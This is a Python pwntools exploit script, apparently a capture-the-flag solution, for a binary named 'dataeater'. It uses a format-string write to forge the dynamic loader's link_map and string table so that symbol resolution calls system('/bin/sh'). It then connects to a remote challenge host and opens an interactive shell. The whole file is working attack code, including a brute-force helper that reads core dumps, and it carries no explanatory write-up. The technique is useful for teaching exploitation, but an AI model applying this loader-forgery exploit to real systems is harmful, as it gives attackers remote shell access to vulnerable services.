from pwn import *
import subprocess

exe = context.binary = ELF('./dataeater', checksec=False)
# context.log_level = 'debug'

def Bruteforce():
	linkmap_pointer = 0x601008
	for x in range(1,99):
		print('--------------------------------------------')
		p = process('./dataeater')
		p.sendline(f"%s%{x}$s".encode())
		p.sendline(b'A'*8 + b' ' + b'B'*8 + b' ' + b'C')
		p.wait()                                       # Wait until it crash
		                                               # If it doesn't crash, check manually
		core = Coredump('./core')
		linkmap_addr = u64(core.read(linkmap_pointer, 8))
		if b'BBBBBBBB' in core.string(linkmap_addr):
			print(x, hex(linkmap_addr))
			print(core.string(linkmap_addr))
			input()
		p.close()

if args.BRUTEFORCE:
	Bruteforce()
	exit()

def CheckWhitespace(payload):
	assert(b' ' not in payload)
	assert(b'\n' not in payload)
	assert(b'\r' not in payload)
	assert(b'\t' not in payload)

################ Fake linkmap struct (part 1) ################
_ = """
# define DT_STRTAB        5
# define DT_SYMTAB        6
# define DT_JMPREL        23

type = struct link_map {
    Elf64_Addr l_addr;
    char *l_name;
    Elf64_Dyn *l_ld;
    struct link_map *l_next;
    struct link_map *l_prev;
    struct link_map *l_real;
    Lmid_t l_ns;
	struct libname_list *l_libname;
    Elf64_Dyn *l_info[77];
"""

linkmap_struct = p64(0)			# l_addr
linkmap_struct += p64(0)		# l_name
linkmap_struct += p64(0)		# l_ld
linkmap_struct += p64(0)		# l_next
linkmap_struct += p64(0)		# l_prev
linkmap_struct += p64(0)		# l_real
linkmap_struct += p64(0)		# l_ns
linkmap_struct += p64(0)		# l_libname
linkmap_struct += flat(0, 0, 0, 0, 0)
			# l_info[  0  1  2  3  4]

################ Fake DT_STRTAB ################
buf_addr = 0x601080
buf_data = fit({                      # need exe = context.binary before use fit() and flat()
	0: b'/bin/sh\x00',
	8: flat(5, buf_addr),
	55: b'system\x00'
	}, filler=b'\x00')
_ = """
# buf_data above will equal to:
buf_data = b'/bin/sh\x00'
buf_data += p64(5)
buf_data += p64(buf_addr),
buf_data = buf_data.ljust(55, b'\x00')
buf_data += b'system\x00'
"""

################ Fake linkmap struct (part 2) ################
linkmap_struct += p64(buf_addr+8)		# l_info[DT_STRTAB] (Change here)
linkmap_struct += p64(0x600eb0)			# l_info[DT_SYMTAB]

# p = process('./dataeater')
p = connect('mc.ax', 31869)

p.sendline(b'%s%32$s')
p.sendline(buf_data + b' ' + linkmap_struct)

p.interactive()